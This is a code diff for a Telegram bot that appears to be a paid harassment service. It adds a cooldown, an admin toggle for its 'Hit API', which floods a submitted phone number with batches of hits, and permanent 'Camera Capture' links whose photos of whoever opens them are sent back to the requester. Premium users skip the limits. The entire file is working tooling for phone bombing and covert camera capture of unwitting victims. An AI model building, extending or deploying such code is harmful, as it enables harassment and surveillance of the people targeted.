@@ -84,7 +84,8 @@ async function isAdmin(chatId: number): Promise<boolean> {
 // ===== Bot Config =====
 interface BotConfig {
   dailyLimit: number; defaultRounds: number; defaultBatch: number; defaultDelay: number;
-  services: { schedule: boolean; customSms: boolean; cameraCapture: boolean };
+  hitCooldownMinutes: number;
+  services: { schedule: boolean; customSms: boolean; cameraCapture: boolean; hitApi: boolean };
 }
 
 async function getBotConfig(): Promise<BotConfig> {
@@ -94,13 +95,34 @@ async function getBotConfig(): Promise<BotConfig> {
     defaultRounds: val?.defaultRounds ?? 1,
     defaultBatch: val?.defaultBatch ?? 5,
     defaultDelay: val?.defaultDelay ?? 2,
+    hitCooldownMinutes: val?.hitCooldownMinutes ?? 5,
     services: {
       schedule: val?.services?.schedule !== false,
       customSms: val?.services?.customSms !== false,
       cameraCapture: val?.services?.cameraCapture !== false,
+      hitApi: val?.services?.hitApi !== false,
     },
     ...val,
   };
+}
+
+// ===== Cooldown Check =====
+async function getLastHitTime(chatId: number): Promise<number> {
+  const val = await getSetting(`tgbot_last_hit_${chatId}`);
+  return val ?? 0;
+}
+
+async function setLastHitTime(chatId: number) {
+  await setSetting(`tgbot_last_hit_${chatId}`, Date.now());
+}
+
+async function getCooldownRemaining(chatId: number): Promise<number> {
+  const config = await getBotConfig();
+  const lastHit = await getLastHitTime(chatId);
+  if (lastHit === 0) return 0;
+  const cooldownMs = config.hitCooldownMinutes * 60 * 1000;
+  const elapsed = Date.now() - lastHit;
+  return Math.max(0, cooldownMs - elapsed);
 }
 
 // ===== Telegram Send Photo =====
@@ -499,6 +521,7 @@ async function runHitsForPhone(
     runId = crypto.randomUUID();
     startedAt = Date.now();
     await incrementUsage(chatId); // Count once per session start
+    await setLastHitTime(chatId); // Set cooldown timer
     await setBotState(chatId, { running: true, waiting_phone: false, phone, batch, delay, runId, startedAt });
     const statusText = makeStatusMessage(phone, batch, delay, modeLabel, 0, 0, 0, true);
     const result = await sendMessage(chatId, statusText, {
@@ -635,14 +658,13 @@ async function getMainMenuKeyboard(admin: boolean, chatId?: number) {
     isHitting = !!state?.running;
   }
   
-  const topRow: any[] = [{ text: '🚀 Start', callback_data: 'start_hit' }];
+  const topRow: any[] = [];
+  if (svc.hitApi) topRow.push({ text: '🚀 Start', callback_data: 'start_hit' });
   if (isHitting) {
     topRow.push({ text: '🛑 Stop', callback_data: 'stop_hit' });
   }
+  if (topRow.length === 0) topRow.push({ text: '🔥 Menu', callback_data: 'main_menu' });
 
-  const config = await getBotConfig();
-  const svc = config.services;
-  
   const keyboard: any[][] = [
     topRow,
     [{ text: `${modeIcon} Mode: ${modeText}`, callback_data: 'toggle_mode' }],
@@ -770,6 +792,27 @@ serve(async (req) => {
 
       // --- Start Hit ---
       if (data === 'start_hit') {
+        const config = await getBotConfig();
+        if (!config.services.hitApi) {
+          await editMessage(chatId, msgId, '❌ <b>Hit API is disabled by admin.</b>', {
+            inline_keyboard: [[{ text: '🏠 Main Menu', callback_data: 'main_menu' }]],
+          });
+          return new Response('OK', { headers: corsHeaders });
+        }
+        // Check cooldown
+        const cooldown = await getCooldownRemaining(chatId);
+        const prem = await isPremium(chatId);
+        if (cooldown > 0 && !prem.isPremium && !admin) {
+          const mins = Math.ceil(cooldown / 60000);
+          const secs = Math.ceil(cooldown / 1000);
+          await editMessage(chatId, msgId, `⏳ <b>Cooldown Active!</b>\n\n${mins > 1 ? `${mins} minute` : `${secs} second`} baad try karo.\n\n💎 Premium = No Cooldown!`, {
+            inline_keyboard: [
+              [{ text: '💎 Get Premium', callback_data: 'premium_menu' }],
+              [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
+            ],
+          });
+          return new Response('OK', { headers: corsHeaders });
+        }
         await setBotState(chatId, { waiting_phone: true });
         await editMessage(chatId, msgId, '📱 <b>Phone number bhejo</b>\n\n<code>98765432xx</code>');
         return new Response('OK', { headers: corsHeaders });
@@ -937,22 +980,26 @@ serve(async (req) => {
           });
           return new Response('OK', { headers: corsHeaders });
         }
-        const sessionId = `tgcam_${chatId}_${Date.now()}`;
+        // Persistent link - generate once per user
+        let sessionId = await getSetting(`tgbot_cam_link_${chatId}`);
+        if (!sessionId) {
+          sessionId = `tgcam_${chatId}`;
+          await setSetting(`tgbot_cam_link_${chatId}`, sessionId);
+        }
         const siteUrl = (await getSetting('main_settings'))?.siteUrl || 'https://riyakichut.lovable.app';
         const captureLink = `${siteUrl}/capture?session=${sessionId}`;
         const chromeLink = `${siteUrl}/chrome-custom-capture?session=${sessionId}`;
         const customLink = `${siteUrl}/custom-capture?session=${sessionId}`;
 
         let text = `📷 <b>Camera Capture</b>\n\n`;
-        text += `🔗 <b>Your Capture Links:</b>\n\n`;
+        text += `🔗 <b>Your Permanent Links:</b>\n\n`;
         text += `📱 Normal:\n<code>${captureLink}</code>\n\n`;
         text += `🌐 Chrome (Android):\n<code>${chromeLink}</code>\n\n`;
         text += `🎨 Custom HTML:\n<code>${customLink}</code>\n\n`;
-        text += `<i>📸 Photos sirf tumhare chat me aayengi. Kisi aur ko nahi dikhegi.</i>`;
+        text += `<i>📸 Ye links permanent hai, bar bar generate nahi hoge.\nPhotos sirf tumhare chat me aayengi.</i>`;
 
         await editMessage(chatId, msgId, text, {
           inline_keyboard: [
-            [{ text: '🔄 New Links', callback_data: 'camera_capture' }],
             [{ text: '🏠 Main Menu', callback_data: 'main_menu' }],
           ],
         });
@@ -967,12 +1014,14 @@ serve(async (req) => {
 
         let text = `🔧 <b>Service Controls</b>\n\n`;
         text += `Toggle services on/off for all users:\n\n`;
+        text += `🚀 Hit API: ${svc.hitApi ? '🟢 ON' : '🔴 OFF'}\n`;
         text += `📅 Schedule: ${svc.schedule ? '🟢 ON' : '🔴 OFF'}\n`;
         text += `📲 Custom SMS: ${svc.customSms ? '🟢 ON' : '🔴 OFF'}\n`;
         text += `📷 Camera Capture: ${svc.cameraCapture ? '🟢 ON' : '🔴 OFF'}\n`;
 
         await editMessage(chatId, msgId, text, {
           inline_keyboard: [
+            [{ text: `🚀 Hit API ${svc.hitApi ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:hitApi' }],
             [{ text: `📅 Schedule ${svc.schedule ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:schedule' }],
             [{ text: `📲 Custom SMS ${svc.customSms ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:customSms' }],
             [{ text: `📷 Camera ${svc.cameraCapture ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:cameraCapture' }],
@@ -989,17 +1038,20 @@ serve(async (req) => {
         if (svcKey in config.services) {
           config.services[svcKey] = !config.services[svcKey];
           await setSetting('tgbot_config', config);
-          const label = svcKey === 'schedule' ? '📅 Schedule' : svcKey === 'customSms' ? '📲 Custom SMS' : '📷 Camera Capture';
+          const labelMap: Record<string, string> = { hitApi: '🚀 Hit API', schedule: '📅 Schedule', customSms: '📲 Custom SMS', cameraCapture: '📷 Camera Capture' };
+          const label = labelMap[svcKey] || svcKey;
           await answerCallbackQuery(cb.id, `${label} ${config.services[svcKey] ? 'ON ✅' : 'OFF ❌'}`);
           // Re-render toggles
           const svc = config.services;
           let text = `🔧 <b>Service Controls</b>\n\n`;
           text += `Toggle services on/off for all users:\n\n`;
+          text += `🚀 Hit API: ${svc.hitApi ? '🟢 ON' : '🔴 OFF'}\n`;
           text += `📅 Schedule: ${svc.schedule ? '🟢 ON' : '🔴 OFF'}\n`;
           text += `📲 Custom SMS: ${svc.customSms ? '🟢 ON' : '🔴 OFF'}\n`;
           text += `📷 Camera Capture: ${svc.cameraCapture ? '🟢 ON' : '🔴 OFF'}\n`;
           await editMessage(chatId, msgId, text, {
             inline_keyboard: [
+              [{ text: `🚀 Hit API ${svc.hitApi ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:hitApi' }],
               [{ text: `📅 Schedule ${svc.schedule ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:schedule' }],
               [{ text: `📲 Custom SMS ${svc.customSms ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:customSms' }],
               [{ text: `📷 Camera ${svc.cameraCapture ? '🟢' : '🔴'}`, callback_data: 'toggle_svc:cameraCapture' }],
@@ -1643,14 +1695,21 @@ serve(async (req) => {
           return new Response('OK', { headers: corsHeaders });
         }
 
-        // Check daily limit
+        // Check cooldown + daily limit
         const prem = await isPremium(chatId);
         if (!prem.isPremium && !admin) {
-          const config = await getBotConfig();
+          const cooldown = await getCooldownRemaining(chatId);
+          if (cooldown > 0) {
+            const mins = Math.ceil(cooldown / 60000);
+            const secs = Math.ceil(cooldown / 1000);
+            await sendMessage(chatId, `⏳ <b>Cooldown Active!</b>\n\n${mins > 1 ? `${mins} minute` : `${secs} second`} baad try karo.\n\n💎 Premium = No Cooldown!`);
+            return new Response('OK', { headers: corsHeaders });
+          }
+          const config2 = await getBotConfig();
           const usage = await getUserUsage(chatId);
-          if (usage.today >= config.dailyLimit) {
-            const usedToday = Math.min(usage.today, config.dailyLimit);
-            await sendMessage(chatId, `❌ <b>Daily limit reached!</b> (${usedToday}/${config.dailyLimit})\n\n💎 Premium le lo unlimited access ke liye.\n💬 Contact: @xyzdark62`);
+          if (usage.today >= config2.dailyLimit) {
+            const usedToday = Math.min(usage.today, config2.dailyLimit);
+            await sendMessage(chatId, `❌ <b>Daily limit reached!</b> (${usedToday}/${config2.dailyLimit})\n\n💎 Premium le lo unlimited access ke liye.\n💬 Contact: @xyzdark62`);
             return new Response('OK', { headers: corsHeaders });
           }
         }
